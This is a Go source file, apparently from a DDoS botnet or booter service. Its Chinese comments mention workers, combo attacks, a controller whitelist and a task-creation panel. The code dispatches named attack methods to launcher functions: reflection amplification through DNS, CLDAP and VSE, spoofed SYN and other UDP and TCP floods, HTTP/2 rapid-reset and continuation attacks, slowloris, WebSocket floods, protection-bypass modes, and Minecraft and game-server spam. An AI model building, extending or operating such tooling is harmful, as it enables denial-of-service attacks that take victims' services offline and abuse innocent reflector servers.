package attack

// ============================================================
// 攻击方法统一分派表（单一事实来源）
//
// 历史上方法清单散落在多处（worker 单任务 switch、combo 子攻击 switch、
// Controller validMethods 白名单、前端两个下拉、i18n 词典），导致过两次
// 真实事故：
//   - validMethods 漏掉 6 个新增方法 → 面板创建任务被拒 "unknown method"
//   - worker 单任务分派漏掉 tcp_syn_spoof → 单方法攻击静默不执行
// 现在分派与清单集中在此：worker 执行、combo 子攻击、Controller 白名单
// 全部由此派生（前端清单由 tools/consistency_check.js 校验）。
// ============================================================

// StartMethod 按 cfg.Method 分派攻击启动函数；未知方法返回 nil。
// 调用方（worker 单任务 / combo 子攻击）在调用前完成各自的前置准备
// （反射器池注入、spoof 能力降级等）。
func StartMethod(cfg AttackConfig) *AttackSession {
	switch cfg.Method {
	case "vse":
		return StartVSEAttackEx(cfg)
	case "vse_reflector":
		return StartVSEAmplificationEx(cfg)
	case "dns_reflector":
		return StartDNSAmplificationEx(cfg)
	case "cldap_reflector":
		return StartCLDAPAmplificationEx(cfg)
	case "udp_stdhex", "udp_plain", "udp_bypass", "udp_burst":
		return StartUDPFloodEx(cfg)
	case "tcp_syn", "tcp_ack", "tcp_connect", "tcp_tcpbypass":
		return StartTCPFloodEx(cfg)
	case "tcp_syn_spoof":
		return StartSpoofedTCPFloodEx(cfg)
	case "http_flood":
		return StartHTTPFloodEx(cfg)
	case "head_flood":
		return StartHEADFloodEx(cfg)
	case "range_flood":
		return StartRangeFloodEx(cfg)
	case "post_flood":
		return StartPOSTFloodEx(cfg)
	case "http2_flood":
		return StartHTTP2FloodEx(cfg)
	case "http2_reset":
		return StartHTTP2ResetEx(cfg)
	case "http2_continuation":
		return StartHTTP2ContinuationEx(cfg)
	case "http2_bomb":
		return StartHTTP2BombEx(cfg)
	case "h2_ping":
		return StartH2PingEx(cfg)
	case "tls_handshake":
		return StartTLSHandshakeEx(cfg)
	case "slowloris", "slow_post":
		return StartSlowlorisEx(cfg)
	case "ws_flood":
		return StartWSFloodEx(cfg)
	case "ws_slow":
		return StartWSSlowEx(cfg)
	case "https_bypass":
		return StartHTTPSBypassEx(cfg)
	case "minecraft_handshake", "minecraft_login":
		return StartMinecraftAttackEx(cfg)
	case "game_udp":
		return StartGameUDPSpamEx(cfg)
	}
	return nil
}

// SupportedMethods 返回全部可派发的攻击方法（不含 combo——combo 由调用方
// 特殊处理）。Controller 的 validMethods 白名单由此派生，保证
// "白名单允许的方法"与"引擎能执行的方法"永不脱节。
func SupportedMethods() []string {
	return []string{
		"vse", "vse_reflector", "dns_reflector", "cldap_reflector",
		"udp_stdhex", "udp_plain", "udp_bypass", "udp_burst",
		"tcp_syn", "tcp_ack", "tcp_connect", "tcp_tcpbypass", "tcp_syn_spoof",
		"http_flood", "head_flood", "range_flood", "post_flood",
		"http2_flood", "http2_reset", "http2_continuation", "http2_bomb",
		"h2_ping", "tls_handshake", "slowloris", "slow_post",
		"ws_flood", "ws_slow", "https_bypass",
		"minecraft_handshake", "minecraft_login", "game_udp",
	}
}
